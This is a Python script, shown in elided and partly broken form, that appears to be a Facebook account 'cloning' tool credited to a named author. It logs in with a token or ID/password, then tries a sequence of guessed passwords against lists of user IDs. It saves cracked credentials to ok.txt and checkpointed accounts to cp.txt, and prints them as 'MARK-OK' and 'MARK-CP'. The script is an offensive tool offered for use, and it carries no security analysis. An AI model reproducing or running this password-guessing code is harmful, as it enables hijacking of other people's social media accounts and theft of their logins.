...
"""
try:
    my = requests.get("https://www.facebook.com/xtylish.pathani.404")
...
agents = [
  ...
  "Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
]
...
\033[1;97m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
\033[1;37m-----------------------------------------------                          
\033[1;37m(*) Author   :\033[1;33m Mark Cornel
\033[1;37m(*) WhatsApp :\033[1;33m +2347013107449
\033[1;37m(*) Fb      :\033[1;33m https://www.facebook.com/queeneth.amadi.3
\033[1;31m-----------------------------------------------
"""
def login():
    os.system("clear")
    print(logo)
    print("")
    print("\033[0;93m[1] Token login")
    print("\033[0;93m[2] ID/Pass login")
    print("")
    login_select()
def login_select():
...
def login_fb():
	...
	if "loc" in q:
		...
		print("\t\033[1;94mID/Number/Password may be wrong\033[1;97m")
		print("")
		raw_input(" Press enter to try again ")
		login()
...
def b_menu():
    ...
    print(logo)
    print("")
    print("\033[0;93m[1] Public Cloning")    
    print("\033[0;93m[2] Followers Cloning")
    print("\033[0;93m[3] File Cloning")
    print("\033[0;93m[0] Exit")
    print("")
    b_menu_select()
def b_menu_select():
	...
	time.sleep(0.5)
	print(" Hacking Processing Please Wait....")
	print("")
	print 47*("\033[1;37m-")
	print('')
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass1+"\x1b[1;37m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass2+"\x1b[1;37m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass3+"\x1b[1;37m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass4+"\x1b[1;37m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass5)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass5+"\x1b[1;37m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass6+"\x1b[1;37m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass7)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass7+"\x1b[1;37m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                            ...
		                                                            d=json.loads(q)
		                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                 print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass8)
		                                                                 cp=open("cp.txt","a")
		                                                                 cp.write(uid+" | "+pass8+"\n")
		                                                                 cp.close()
		                                                                 cps.append(uid)
		                                                                ...
		                                                                if 'access_token' in d:
		                                                                    print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass8+"\x1b[1;37m")
		                                                                    ok=open("ok.txt","a")
		                                                                    ok.write(uid+" | "+pass8+"\n")
		                                                                    ok.close()
		                                                                    oks.append(uid)
		                                                                    ...
		                                                                    d=json.loads(q)
		                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                        print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass9)
		                                                                        cp=open("cp.txt","a")
		                                                                        cp.write(uid+" | "+pass9+"\n")
		                                                                        cp.close()
		                                                                        cps.append(uid)
		                                                                        ...
		                                                                        if 'access_token' in d:
		                                                                            print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass9+"\x1b[1;37m")
		                                                                            ok=open("ok.txt","a")
		                                                                            ok.write(uid+" | "+pass9+"\n")
		                                                                            ok.close()
		                                                                            oks.append(uid)
		                                                                            ...
		                                                                            d=json.loads(q)
		                                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                                print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass10)
		                                                                                cp=open("cp.txt","a")
		                                                                                cp.write(uid+" | "+pass10+"\n")
		                                                                                cp.close()
		                                                                                cps.append(uid)
		                                                                                ...
		                                                                                if 'access_token' in d:
		                                                                                    print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass10+"\x1b[1;37m")
		                                                                                    ok=open("ok.txt","a")
		                                                                                    ok.write(uid+" | "+pass10+"\n")
		                                                                                    ok.close()
		                                                                                    oks.append(uid) 
		                                                                                    ...
		                                                                                    d=json.loads(q)
		                                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                                        print("\x1b[1;33m[MARK-CP] "+uid+" | "+pass11)
		                                                                                        cp=open("cp.txt","a")
		                                                                                        cp.write(uid+" | "+pass11+"\n")
		                                                                                        cp.close()
		                                                                                        cps.append(uid)
		                                                                                        ...
		                                                                                        if 'access_token' in d:
		                                                                                            print("\x1b[1;34m[MARK-OK] \033[1;32m"+uid+" | "+pass11+"\x1b[1;37m")
		                                                                                            ok=open("ok.txt","a")
		                                                                                            ok.write(uid+" | "+pass11+"\n")
		                                                                                            ok.close()
		                                                                                            oks.append(uid)                                                
